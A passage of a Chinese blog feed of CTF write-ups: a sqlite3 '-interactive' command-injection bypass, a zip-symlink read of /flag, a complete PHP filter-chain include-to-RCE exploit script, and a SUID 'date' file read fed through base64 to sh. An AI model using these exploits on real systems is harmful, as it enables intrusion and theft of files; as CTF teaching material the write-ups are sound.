class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">                     _______   _____     ___   __    _____       _      _ _______   </span></span><br><span class="line"><span class="string">              ____  |__   __| |  __ \   / _ \ / _|  / ____|     | |    (_)__   __|  </span></span><br><span class="line"><span class="string">  _ __ ___   / __ \ ___| | ___| |__) | | | | | |_  | (___   __ _| |     _   | | ___ </span></span><br><span class="line"><span class="string"> | &#x27;</span>_ ` _ \ / / _` / __| |/ _ \  _  /  | | | |  _|  \___ \ / _` | |    | |  | |/ _ \</span><br><span class="line"> | | | | | | | (_| \__ \ |  __/ | \ \  | |_| | |    ____) | (_| | |____| |  | |  __/</span><br><span class="line"> |_| |_| |_|\ \__,_|___/_|\___|_|  \_\  \___/|_|   |_____/ \__, |______|_|  |_|\___|</span><br><span class="line">             \____/                                           | |                   </span><br><span class="line">                                                              |_|                   </span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(WELCOME)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def name_generator(size=6, chars=string.ascii_uppercase + string.digits):</span></span><br><span class="line"><span class="string">    return &#x27;</span><span class="string">&#x27;.join(random.choice(chars) for _ in range(size))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tmp_dbpath = f&#x27;</span>/tmp/&#123;name_generator()&#125;.db<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">query_idea = input(&quot;Input your Query command ---&gt;&gt; &quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">black_list = [&#x27;</span>.<span class="string">&#x27;, &#x27;</span>lo<span class="string">&#x27;, &#x27;</span>;<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for y in black_list:</span></span><br><span class="line"><span class="string">    if y in query_idea:</span></span><br><span class="line"><span class="string">        print(&quot;Hacker! Banned...&quot;)</span></span><br><span class="line"><span class="string">        exit()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sqlite3_process = subprocess.Popen([&quot;sqlite3&quot;, tmp_dbpath, query_idea], stdout=subprocess.PIPE)</span></span><br><span class="line"><span class="string">(output, error) = sqlite3_process.communicate()</span></span><br><span class="line"><span class="string">#Show your output!</span></span><br><span class="line"><span class="string">print(output.decode())</span></span><br></pre></td></tr></table></figure><p>审计发现，核心代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3_process = subprocess.Popen([<span class="string">&quot;sqlite3&quot;</span>, tmp_dbpath, query_idea], stdout=subprocess.PIPE)</span><br><span class="line">(output, error) = sqlite3_process.communicate()</span><br></pre></td></tr></table></figure><p>Command Injection，<code>query_idea</code>可控, 但题目过滤了<code>[&#39;.&#39;, &#39;lo&#39;, &#39;;&#39;]</code></p><p>查阅官方文档<a href="https://www.sqlite.org/cli.html%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">https://www.sqlite.org/cli.html，发现可命令执行</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sqlite3</span> Tao</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .shell <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">sqlite&gt; .system <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),141(kaboxer)</span><br></pre></td></tr></table></figure><p>但是发现题目只可执行一次命令，且过滤了<code>.</code>,但是由于<code>query_idea</code>可控，且通过官方文档，发现交互参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-interactive         force interactive I/O<span class="comment"># sqlite3 --help</span></span><br></pre></td></tr></table></figure><p>至此，我们的思路就是通过交互式，绕过python的过滤，达到命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Input your Query <span class="built_in">command</span> ---&gt;&gt; -interactive <span class="comment"># here</span></span><br><span class="line">.shell <span class="built_in">ls</span> /<span class="comment"># here</span></span><br><span class="line">.system <span class="built_in">cat</span> /fl*<span class="comment"># here</span></span><br><span class="line">.quit</span><br><span class="line">SQLite version 3.37.2 2022-01-06 13:25:41</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag.txt</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">sqlite&gt; flag&#123;SCT7SK7PLPD343ZMXFWS8U7RQCHE2TUQ&#125;sqlite&gt;</span><br></pre></td></tr></table></figure><h3 id="0x3-sakana-reveage"><a href="#0x3-sakana-reveage" class="headerlink" title="0x3. sakana_reveage"></a>0x3. sakana_reveage</h3><p>通过审计代码发现，主要考察zip软链接。最终解压缩命令执行的压缩包文件路径在&#x2F;tmp&#x2F;sakanas.zip</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919175823473.png" alt="image-20220919175823473"></p><p>还有就是base64解码后要有<code>sakana</code>字段</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919180023926.png" alt="image-20220919180023926"></p><p>nc连接</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919180505254.png" alt="image-20220919180505254"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># payload = base64 flag.zip</span><br><span class="line">ln -s /flag soft_flag</span><br><span class="line">zip --symlink flag.zip soft_flag</span><br><span class="line">base64 flag.zip</span><br></pre></td></tr></table></figure><p>payload加入<code>sakana</code>字段后base64编码</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919180745363.png" alt="image-20220919180745363"></p><p>输入1上传</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919181350696.png" alt="image-20220919181350696"></p><p>然后选择4,然后随便输入一个字符串,需要触发sakana_upload函数的binascii.Error</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919180848583.png" alt="image-20220919180848583"></p><p>最后输入2下载得到flag的base64加密字符串</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919181224438.png" alt="image-20220919181224438"></p><p>base64解密得到flag</p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919181256278.png" alt="image-20220919181256278"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022第五空间网络安全大赛初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年羊城杯网络安全大赛Writeup</title>
      <link href="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/"/>
      <url>/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>By ACT</p><p>2022.9.4</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-rce-me"><a href="#1-rce-me" class="headerlink" title="1.rce_me"></a>1.rce_me</h3><p>题目直接给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到代码中<code>include $file;</code>，就想起了hxp 的一道题<a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a>,有师傅也给出了具体的详细分析，见<a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p><p>但是题目环境没有忽略报错，所以直接打文章中的exp,有两个问题：</p><p>1.代码中过滤了<code>_</code>,文章中的exp payload带<code>4</code>(对应的转换语句带<code>_</code>)，因此攻击的payload最终会有<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line"><span class="comment"># 有_</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>2.由于<code>include php代码</code>，且环境没有忽略报错，那么我们就应该对后面乱码进行注释。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;?=`$_GET[0]`;;/*</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Lyo&quot;</span></span><br></pre></td></tr></table></figure><p>上述代码解决了什么问题呢？可以简单理解为：</p><ol><li>避免了<code>4</code>,因为他对应的转换带<code>_</code></li><li>注释了后面形成乱码的PHP代码</li></ol><p>原文中由于没有<code>Lyo</code>这三个字符对应的形成转换语句，所以借助<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a>这个项目，项目将单字母数字基本都fuzz到了。根据以上我们可构造rce payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-f0cb7de3c6d445ca9916505908395850.dasc.buuoj.cn:81/&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;/*</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Lyo&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c in base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = f<span class="string">&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(final_payload)</span></span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904102910545.png"></p><p>但这题后面还得绕，默认是<code>www-data</code>权限，首先想到的就是SUID提权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=final_payload&amp;<span class="number">0</span>=find+/+-user+root+-perm+-<span class="number">4000</span>+-<span class="keyword">print</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/date# 可读文件</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure><blockquote><p>注：final_payload是上面python脚本生成的</p></blockquote><p>因为脚本过滤了<code>&gt;</code>等特殊字符，所以我们通过base64编码绕过</p><blockquote><p>这里要绕<code>&gt;</code>等特殊字符的原因是，<code>date -f /flag</code> 提取flag是通过<code>标准错误输出 -&gt; 2</code>打印的，请求响应不显示。所以我们错误输出转标准输出，既<code>2&gt;&amp;1</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> <span class="string">&quot;date -f /flag 2&gt;&amp;1&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">ZGF0ZSAtZiAvZmxhZyAyPiYxCg==</span><br><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|<span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">date</span> -f /flag 2&gt;&amp;1</span><br><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|<span class="built_in">base64</span> -d | sh</span><br><span class="line"><span class="built_in">date</span>: invalid <span class="built_in">date</span> ‘Tao By ACT.’</span><br><span class="line">ouo@GOTA:~$</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904103942017.png"></p><p>有关SUID读取文件小技巧可看：<a href="https://gtfobins.github.io/">GTFOBins </a></p><p>综上所述，最终获取flag的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=final_payload&amp;<span class="number">0</span>=<span class="keyword">echo</span>+ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64+-d|sh </span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904104235612.png"></p><h3 id="2-step-by-step-v3"><a href="#2-step-by-step-v3" class="headerlink" title="2.step_by_step-v3"></a>2.step_by_step-v3</h3><p>存在反序列化</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195102232.png"></p><p>入口在<code>cheng::__wakeup()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;c1 指向 new bei() 可以调用bei类的__set()魔术方法</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195025128.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;b1 指向new yang() 可以调用yang类的__toString()魔术方法</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195224768.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;y1可控，这里可以执行phpinfo函数</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195422375.png"></p><p>构造exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 